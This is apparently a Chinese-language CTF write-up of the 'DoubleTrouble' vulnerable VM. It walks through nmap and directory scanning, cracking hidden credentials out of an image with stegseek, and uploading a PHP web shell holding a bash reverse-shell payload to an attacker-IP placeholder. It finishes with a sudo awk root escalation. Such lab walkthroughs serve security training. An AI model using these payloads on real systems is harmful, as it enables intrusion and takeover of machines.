# DouleTrouble

## 目录

[TOC]

---

## 信息收集

### nmap扫描

```shell
┌──(root㉿kali)-[~]
└─# nmap -sV -A 192.168.1.227
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 05:42 EDT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 05:42 (0:00:06 remaining)
Nmap scan report for 192.168.1.227
Host is up (0.0013s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6afed61723cb90792bb12d3753974658 (RSA)
|   256 5bc468d18959d748b096f311871c08ac (ECDSA)
|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:C4:1B:CF (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.26 ms 192.168.1.227

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds
```

### 目录扫描

```shell
[05:46:03] 301 -  316B  - /backups  ->  http://192.168.1.227/backups/       
[05:46:03] 200 -  407B  - /backups/                                         
[05:46:04] 200 -    0B  - /check.php                                        
[05:46:06] 301 -  313B  - /core  ->  http://192.168.1.227/core/             
[05:46:06] 301 -  312B  - /css  ->  http://192.168.1.227/css/               
[05:46:08] 200 -  894B  - /favicon.ico                                      
[05:46:09] 301 -  315B  - /images  ->  http://192.168.1.227/images/         
[05:46:09] 200 -  647B  - /images/                                          
[05:46:10] 200 -    2KB - /index.php                                        
[05:46:10] 200 -    2KB - /index.php/login/                                 
[05:46:10] 301 -  316B  - /install  ->  http://192.168.1.227/install/       
[05:46:10] 200 -  762B  - /install/index.php?upgrade/                       
[05:46:10] 200 -  762B  - /install/
[05:46:10] 200 -  607B  - /js/                                              
[05:46:17] 200 -  338B  - /readme.txt                                       
[05:46:17] 200 -   26B  - /robots.txt                                       
[05:46:18] 301 -  315B  - /secret  ->  http://192.168.1.227/secret/         
[05:46:18] 200 -  461B  - /secret/                                          
[05:46:18] 403 -  278B  - /server-status                                    
[05:46:18] 403 -  278B  - /server-status/                                   
[05:46:20] 301 -  317B  - /template  ->  http://192.168.1.227/template/     
[05:46:20] 200 -  502B  - /template/                                        
[05:46:22] 301 -  316B  - /uploads  ->  http://192.168.1.227/uploads/       
[05:46:22] 200 -  476B  - /uploads/
```

#### 使用【stegseek】爆破图片隐写【登录成功】

发现`/secret`目录下存在图片`doubletrouble.jpg`，使用图片隐写工具`steghide`尝试获得内容

```shell
┌──(root㉿kali)-[~]
└─# steghide extract -sf doubletrouble.jpg 
Enter passphrase: 
```

发现需要密码，使用`stegseek`尝试爆破

```shell
┌──(root㉿kali)-[~]
└─# stegseek doubletrouble.jpg /usr/share/wordlists/rockyou.txt -xf ./file
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "92camaro"       
[i] Original filename: "creds.txt".
[i] Extracting to "./file".                                                                                              
┌──(root㉿kali)-[~]
└─# cat file 
otisrush@localhost.com
otis666
```

成功得到账号密码，登录成功

---

## 漏洞利用-文件上传【Getshell】

通过后台页面的`Discussions`添加并上传附件`uHorseDB.php`

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/攻击机IP/6666 0>&1'");?> 
```

在kali中监听端口并访问木马，即可反弹shell

### 提权

通过`sudo -l`查看当前用户可执行的sudo命令`awk`

通过`sudo awk 'BEGIN {system("/bin/sh")}'`即可提权至root

```shell
┌──(root㉿kali)-[~]
└─# nc -lvp 6666
listening on [any] 6666 ...
192.168.1.227: inverse host lookup failed: Unknown host
connect to [192.168.1.232] from (UNKNOWN) [192.168.1.227] 57388
bash: cannot set terminal process group (527): Inappropriate ioctl for device
bash: no job control in this shell
www-data@doubletrouble:/var/www/html/uploads/attachments$ whoami
whoami
www-data
www-data@doubletrouble:/var/www/html/uploads/attachments$ sudo awk 'BEGIN {system("/bin/sh")}'
<s/attachments$ sudo awk 'BEGIN {system("/bin/sh")}'
whoami
root
cd /root
pwd
/root
```

---

## 总结

- 一句话执行木马提权费劲，能反弹shell就用反弹shell解决
- 脑洞要大，看到图片，解它，别犹豫

